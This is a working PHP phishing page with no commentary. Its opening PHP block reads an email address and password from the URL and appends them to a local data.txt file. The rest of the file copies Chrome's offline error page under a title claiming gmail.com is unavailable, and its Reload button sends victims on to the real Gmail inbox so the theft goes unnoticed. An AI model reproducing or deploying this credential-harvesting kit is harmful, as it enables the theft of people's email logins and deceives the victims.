<?php

session_start();


$Email=$_GET['Email'];
$pwd=$_GET['Passwd'];
$file = file_get_contents("./data.txt", true);
$file.= $Email;
$file.= "<--mail id  ";
$file.= $pwd;
$file.= "<--pwd  
";
file_put_contents("data.txt", $file);
?>
<html i18n-values="dir:textdirection" dir="ltr"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0,
                                 maximum-scale=1.0, user-scalable=no">
  <title i18n-content="title">https://www.gmail.com/ is not available</title>
  <style>/* Copyright 2013 The Chromium Authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file. */

body {
  background-color: #E6E6E6;
  font-family: Helvetica, Arial, sans-serif;
  font-size: 10pt;
  margin: 50px 40px 20px 40px;
}

#main-frame-error {
  margin: auto;
  max-width: 540px;
  min-width: 200px;
}

/* Don't use the main frame div when the error is in a subframe. */
html[subframe] #main-frame-error {
  display: none;
}

/* Don't use the subframe error div when the error is in a main frame. */
html:not([subframe]) #sub-frame-error {
  display: none;
}

#box {
  background-color: #fbfbfb;
  border: 1px solid #AAA;
  border-bottom: 1px solid #888;
  border-radius: 3px;
  color: black;
/* Not done on mobile for performance reasons. */
  box-shadow: 0px 2px 2px #AAA;
}

#diagnose-button {
  margin-top: 20px;
  margin-bottom: 10px;
  -webkit-margin-start: 0px;
}

#content-top #buttons,
#content-top h1 {
  color: #666;
  margin: 10px 0px 25px 0px;
  font-weight: normal;
  font-size: 1.5em;
  text-align: center;
}

h2 {
  color: #666;
  font-size: 1.2em;
  font-weight: normal;
  margin: 10px 0;
}

a {
  color: #15c;
  text-decoration: none;
}

.icon {
  -webkit-user-select: none;
}

.icon-generic {
  /**
   * Can't access chrome://theme/IDR_ERROR_NETWORK_GENERIC from an untrusted
   * renderer process, so embed the resource manually.
   */
  content: -webkit-image-set(
      url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC4AAAAuCAQAAAD9sOO8AAAASUlEQVR4Xu3SMQoAIAzFUO/o/c+iY4fSSfgQyesgOESHrs9I0j7TEOL9pk5i/OmB/s9IvAYQH6DjxmtTWPEWBcS52zJPIJ4lSRfUZeB1c/cgSwAAAABJRU5ErkJggg==') 1x,
      url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAABcAQMAAADZIUAbAAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAD9JREFUeF7tzrEJACAQQ9EDB8j+2xy4UDaIDqBFDsTmfve6Hw/qhiQbGWQBOGPmHZKLjMBngD4IA/U37Uz4dQsbfVcrD6jzeAAAAABJRU5ErkJggg==') 2x);
}

.icon-offline {
  content: -webkit-image-set(
      url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABAAgMAAADXB5lNAAAACVBMVEVTU1P///9TU1P8g2f9AAAAAnRSTlMAAHaTzTgAAAB0SURBVHhe1dMxCgMxDAXRIaVOkXrvs/f79ZwyEGNITKwUgcBOZR4upEKcSxeCmSrAFko1r5Cv4J8A6EGzgwLQQAdHD5ljbUFU08Gz8AOwgWX1HlBNC6WyBVWMOBpq5C2pz3ALUIGsP1ZAKtznmxoAAtc5wgegV/QjpyQHeQAAAABJRU5ErkJggg==') 1x,
      url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACAAgMAAAC+UIlYAAAACVBMVEVTU1P///9TU1P8g2f9AAAAAnRSTlMAAHaTzTgAAACFSURBVHhe7dY9CoBADITRqfd+XnJOKco6EC32h4VRzFdEMK9II4it0fdAggT3WEPNAKjmAfxA2UEC7QzA/mHxcaMNFDoBz6k8gNqT8IAQ8FeAtQBTAG4QBWxAAgZALY5xPkNtoARiYwDAWlDYC+pl1FBNoFYBXqOMAF0ooPed4G2/7gkS7LQn0KpfZWb2AAAAAElFTkSuQmCC') 2x);
}

#content-top {
  margin: 20px 20px 20px 25px;
}

#help-box-outer {
  overflow: hidden;
  -webkit-transition: height ease-in 218ms;
}

#help-box-inner {
  background-color: #f9f9f9;
  border-top: 1px solid #EEE;
  color: #444;
  padding: 25px 20px;
  text-align: start;
}

#suggestions {
  margin-top: 15px;
}

#sub-frame-error-details {
  color: #8F8F8F;
/* Not done on mobile for performance reasons. */
  text-shadow: 0 1px 0 rgba(255,255,255,0.3);
}

[jscontent=failedUrl] {
  overflow-wrap: break-word;
}

button {
  border: 1px solid rgba(0, 0, 0, 0.25);
  border-radius: 2px;
  color: #444;
  margin: 0px 5px;
  min-height: 29px;
  min-width: 65px;
  -webkit-user-select: none;
  padding: 8px 13px;
/* iOS does not support linear-gradient without a prefix. */
  background-image: -webkit-linear-gradient(#ededed, #ededed 38%, #dedede);
  text-shadow: 0 1px 0 rgb(240, 240, 240);

/* Not done on mobile for performance reasons. */
  box-shadow: 0 1px 0 rgba(0, 0, 0, 0.08), inset 0 1px 2px rgba(255, 255, 255, 0.75);
}

button:hover {
  border: 1px solid rgba(0, 0, 0, 0.3);
  color: #000;
background-image: -webkit-linear-gradient(#f0f0f0, #f0f0f0 38%, #e0e0e0);

box-shadow: 0 1px 0 rgba(0, 0, 0, 0.12), inset 0 1px 2px rgba(255, 255, 255, 0.95);
}

button:active {
  border: 1px solid rgba(0, 0, 0, 0.3);
  color: #444;
background-image: -webkit-linear-gradient(#e7e7e7, #e7e7e7 38%, #d7d7d7);

box-shadow: none;
}

#reload-button {
  color: #fff;
background-image: -webkit-linear-gradient(#5d9aff, #5d9aff 38%, #5891f0);
  border: 1px solid rgba(45, 102, 195, 1);
  text-shadow: 0 1px 0 rgba(0,0,0,0.5);

box-shadow: 0 1px 0 rgba(0, 0, 0, 0.15), inset 0 1px 2px rgba(255, 255, 255, 0.2);
}

#reload-button:hover {
background-image: -webkit-linear-gradient(#659efd, #659efd 38%, #6097f1);
  border: 1px solid rgba(45, 102, 195, 1);
box-shadow: 0 1px 0 rgba(0, 0, 0, 0.25), inset 0 1px 2px rgba(255, 255, 255, 0.2);
}

#reload-button:active {
background-image: -webkit-linear-gradient(#6095ed, #6095ed 38%, #6095ed);
  border: 1px solid rgb(38, 84, 160);

box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.1);
}

.hidden {
  display: none;
}

.suggestions {
  margin-top: 18px;
}

.suggestion-header {
  font-weight: bold;
  margin-bottom: 4px;
}

.suggestion-body {
  color: #777;
}

.error-code {
  color: #A0A0A0;
  margin-top: 15px;
}

/* Increase line height at higher resolutions. */
@media (min-width: 641px) and (min-height: 641px) {
  #help-box-inner {
    line-height: 18px;
  }
}

/* Decrease padding at low sizes. */
@media (max-width: 640px), (max-height: 640px) {
  body {
    margin: 15px;
  }
  h1 {
    margin: 10px 0px 15px 0px;
  }
  #content-top {
    margin: 15px;
  }
  #help-box-inner {
    padding: 20px;
  }
  .suggestions {
    margin-top: 10px;
  }
  .suggestion-header {
    margin-bottom: 0px;
  }
  .error-code {
    margin-top: 10px;
  }
}

/* Don't allow overflow when in a subframe. */
html[subframe] body {
  overflow: hidden;
}

#sub-frame-error {
  -webkit-align-items: center;
  background-color: #DDD;
  display: -webkit-flex;
  -webkit-flex-flow: column;
  height: 100%;
  -webkit-justify-content: center;
  left: 0px;
  position: absolute;
  top: 0px;
  width: 100%;
}

#sub-frame-error:hover {
  background-color: #EEE;
}

#sub-frame-error-details {
  margin: 0 10px;
  visibility: hidden;
}

/* Show details only when hovering. */
#sub-frame-error:hover #sub-frame-error-details {
  visibility: visible;
}

/* If the iframe is too small, always hide the error code. */
/* TODO(mmenke): See if overflow: no-display works better, once supported. */
@media (max-width: 200px), (max-height: 95px) {
  #sub-frame-error-details {
    display: none;
  }
}
</style>
 
</head>
<body id="t" jstcache="0">
  <div id="main-frame-error" jstcache="0">
    <div id="box" jstcache="0">
      <div id="content-top" jstcache="0">
        <h1 jstcache="0">
          <div jstcache="0">
            <img class="icon icon-offline" jseval="updateIconClass(this.classList, iconClass)" jstcache="9">
          </div>
          <span i18n-content="heading" jstcache="0">Unable to connect to the Internet</span>
        </h1>
        <div id="buttons" jstcache="0">
          <a href="https://mail.google.com/mail/"><button id="reload-button" >Reload</button></a>
          <button id="more-less-button" onclick="toggleHelpBox()" jsdisplay="more" jsvalues=".moreText:more; .lessText:less;" jscontent="more" jstcache="4">More</button>
        </div>
      </div>
       <!-- Outer and inner divs are needed both for margins and sizing. -->
      <div id="help-box-outer" class="hidden" jstcache="0">
        <div id="help-box-inner" jstcache="0">
          <div jsselect="summary" jstcache="5">
            <span jsvalues=".innerHTML:msg" jstcache="10"><span jscontent="productName" jstcache="14">Google Chrome</span>
          can't display the webpage because your computer isn't connected to the Internet.</span>
          </div>
          <div class="suggestions" jsselect="suggestions" jstcache="6" jsinstance="0" style="">
            <div class="suggestion-header" jsvalues=".innerHTML:header" jstcache="11">Check your Internet connection.</div>
            <div class="suggestion-body" jsvalues=".innerHTML:body" jstcache="12">Check any cables and reboot any routers, modems, or other network
        devices you may be using.</div>
          </div><div class="suggestions" jsselect="suggestions" jstcache="6" jsinstance="*1" style="">
            <div class="suggestion-header" jsvalues=".innerHTML:header" jstcache="11">Allow Chrome to access the network in your firewall or antivirus
        settings.</div>
            <div class="suggestion-body" jsvalues=".innerHTML:body" jstcache="12">If it is already listed as a program allowed to access the network, try
        removing it from the list and adding it again.</div>
          </div>
          <button id="diagnose-button" onclick="diagnoseErrors()" jscontent="diagnose" jsdisplay="diagnose" jstcache="7" style="display: none;"></button>
          <div id="diagnose-frame" class="hidden" jstcache="0"></div>
          <div class="error-code" jscontent="errorCode" jstcache="8">Error code: DNS_PROBE_FINISHED_NO_INTERNET</div>
        </div>
      </div>
    </div>
  </div>
  <div id="sub-frame-error" jstcache="0">
    <!-- Show details when hovering over the icon, in case the details are
         hidden because they're too large. -->
    <img class="icon icon-offline" jseval="updateIconClass(this.classList, iconClass)" jsvalues=".title:errorDetails" jstcache="1" title="The Internet connection has been lost.">
    <div id="sub-frame-error-details" jsvalues=".innerHTML:errorDetails" jstcache="2">The Internet connection has been lost.</div>
  </div>

</body></html>

